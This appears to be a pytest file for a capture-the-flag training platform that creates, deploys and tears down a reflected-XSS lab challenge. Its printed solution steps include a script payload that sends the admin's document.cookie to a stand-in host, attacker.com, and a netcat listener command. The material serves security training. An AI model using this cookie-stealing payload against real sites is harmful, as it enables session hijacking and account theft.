import os
import sys
import pytest
import uuid
from datetime import datetime, timedelta

# Add project root to path
sys.path.append(os.path.dirname(os.path.dirname(__file__)))

from apps.api.src.database import SessionLocal
from apps.api.src.models.challenge import Challenge, ChallengeTrack, ChallengeDifficulty, ChallengeMode, ChallengeStatus, ChallengeInstance
from apps.api.src.models.lab import LabTemplate, LabType, NetworkType
from apps.worker.services.lab_manager import LabManager
from apps.worker.tasks.lab_deployment import deploy_lab_instance, terminate_lab_instance

@pytest.fixture
def db():
    """Database session fixture"""
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

@pytest.fixture
def lab_manager():
    """Lab manager fixture"""
    return LabManager()

def test_create_web_challenge(db):
    """Test creating a web application challenge"""
    
    # Create challenge
    challenge = Challenge(
        id=uuid.uuid4(),
        slug="xss-reflected",
        title="Reflected XSS Challenge",
        track=ChallengeTrack.ACCESS_EXPLOIT,
        difficulty=ChallengeDifficulty.MEDIUM,
        points_base=300,
        time_cap_minutes=60,
        mode=ChallengeMode.SOLO,
        status=ChallengeStatus.DRAFT,
        author_id=uuid.uuid4(),  # Replace with actual author ID
        description="""
        # Reflected XSS Challenge
        
        Can you find and exploit the XSS vulnerability in this web application?
        
        The application is a simple note-taking app that allows users to create and view notes.
        However, there's a vulnerability in how the notes are displayed...
        
        ## Objective
        Find the XSS vulnerability and use it to steal the admin's cookie.
        
        ## Hints
        1. Pay attention to how user input is handled
        2. The admin reviews new notes periodically
        """
    )
    db.add(challenge)
    
    # Create lab template
    template = LabTemplate(
        id=uuid.uuid4(),
        challenge_id=challenge.id,
        name="XSS Lab Environment",
        type=LabType.CONTAINER,
        image="vulnerable-notes-app:latest",  # You would need to build this image
        resource_limits={
            "memory_mb": 256,
            "cpu_count": 0.5,
            "disk_gb": 1
        },
        network_config={
            "type": NetworkType.ISOLATED,
            "expose_ports": [8080]
        },
        startup_script="""
        #!/bin/sh
        # Initialize database
        python /app/init_db.py
        
        # Start application
        python /app/app.py
        """,
        exposed_ports=[8080],
        environment={
            "FLASK_ENV": "production",
            "SECRET_KEY": "{{random_string_32}}",
            "ADMIN_PASSWORD": "{{random_string_16}}"
        }
    )
    db.add(template)
    db.commit()
    
    return challenge, template

def test_deploy_challenge(db, lab_manager):
    """Test deploying a challenge instance"""
    
    # Create challenge and template
    challenge, template = test_create_web_challenge(db)
    
    # Create challenge instance
    challenge_instance = ChallengeInstance(
        id=uuid.uuid4(),
        challenge_id=challenge.id,
        user_id=uuid.uuid4(),  # Replace with actual user ID
        dynamic_seed="test-seed-123",
        expires_at=datetime.utcnow() + timedelta(hours=1)
    )
    db.add(challenge_instance)
    db.commit()
    
    # Deploy lab instance
    result = deploy_lab_instance(
        template_id=str(template.id),
        challenge_instance_id=str(challenge_instance.id),
        expires_in_minutes=60
    )
    
    assert result['status'] == 'success'
    assert 'container_id' in result
    assert 'ip_address' in result
    
    # Get lab instance status
    status = lab_manager.get_instance_status(result['container_id'])
    assert status['running'] == True
    
    # Cleanup
    terminate_lab_instance(result['lab_instance_id'])

def test_solve_challenge():
    """
    Test solving the XSS challenge
    
    This is a manual test that prints instructions for solving the challenge.
    In a real environment, you would have automated tests using Selenium or similar.
    """
    
    print("""
    XSS Challenge Solution Steps:
    
    1. Access the application:
       - The application will be available at http://<container_ip>:8080
    
    2. Create a new note with XSS payload:
       ```
       <script>
       fetch('http://attacker.com/steal?cookie=' + document.cookie)
       </script>
       ```
    
    3. Wait for admin review:
       - The admin bot visits new notes every minute
       - When visiting the note, the admin's cookie will be sent to attacker.com
    
    4. Submit the flag:
       - The flag format is: flag{...}
       - The flag will be the admin's cookie value
    
    Expected solution:
    1. Create note with payload
    2. Start netcat listener: nc -lvnp 8000
    3. Wait for admin visit
    4. Receive cookie
    5. Submit flag
    """)

if __name__ == '__main__':
    # Setup
    db = SessionLocal()
    lab_manager = LabManager()
    
    try:
        # Run tests
        print("Creating challenge...")
        challenge, template = test_create_web_challenge(db)
        print(f"Challenge created: {challenge.title}")
        
        print("\nDeploying challenge...")
        challenge_instance = ChallengeInstance(
            id=uuid.uuid4(),
            challenge_id=challenge.id,
            user_id=uuid.uuid4(),
            dynamic_seed="test-seed-123",
            expires_at=datetime.utcnow() + timedelta(hours=1)
        )
        db.add(challenge_instance)
        db.commit()
        
        result = deploy_lab_instance(
            template_id=str(template.id),
            challenge_instance_id=str(challenge_instance.id),
            expires_in_minutes=60
        )
        print(f"Lab deployed: {result}")
        
        print("\nChallenge is ready to solve!")
        print(f"Access the application at: http://{result['ip_address']}:8080")
        
        # Print solution steps
        test_solve_challenge()
        
        # Wait for user input before cleanup
        input("\nPress Enter to cleanup resources...")
        
    finally:
        # Cleanup
        print("\nCleaning up resources...")
        if 'result' in locals():
            terminate_lab_instance(result['lab_instance_id'])
        db.close()
        print("Cleanup complete!")
